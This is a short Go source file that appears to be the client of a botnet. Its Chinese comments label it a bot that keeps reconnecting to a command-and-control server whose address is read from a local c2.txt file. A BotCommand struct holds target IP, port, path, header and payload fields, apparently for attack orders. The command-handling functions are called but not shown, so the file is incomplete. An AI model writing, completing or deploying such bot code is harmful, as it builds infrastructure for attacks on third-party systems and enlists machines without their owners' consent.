package main

import (
	"fmt"
	"log"
	"net"
	"time"
)

const (
	c2File      = "./serverfile/c2.txt"
	retryPeriod = 10 * time.Second
)

// 将json数据解析为结构体，避免类型断言
type BotCommand struct {
    Method  string      `json:"method"`
    IP      string      `json:"ip"`
    Port    int		    `json:"port"`
    Path    string      `json:"path"`
    Header  string 		`json:"header"`
    Payload string 		`json:"payload"`
}


func main() {
	// 记录启动信息
	log.Println("Bot 客户端启动")
	
	// 初始化配置
	initConfig()
	
	// 读取C2地址
	c2Addr := readC2Address()
	log.Printf("C2服务器地址: %s", c2Addr)

	// 主循环 - 连接C2服务器
	for {
		conn, err := net.Dial("tcp", fmt.Sprintf("%s:80", c2Addr))
		if err != nil {
			log.Printf("连接C2服务器失败: %v，%s后重试...", err, retryPeriod)
			time.Sleep(retryPeriod)
			continue
		}

		log.Printf("成功连接到C2服务器: %s", c2Addr)
		handleC2Connection(conn)
		conn.Close()
		log.Println("连接中断，准备重新连接...")
		
		// 防止快速重连导致的大量日志
		time.Sleep(2 * time.Second)
	}
}
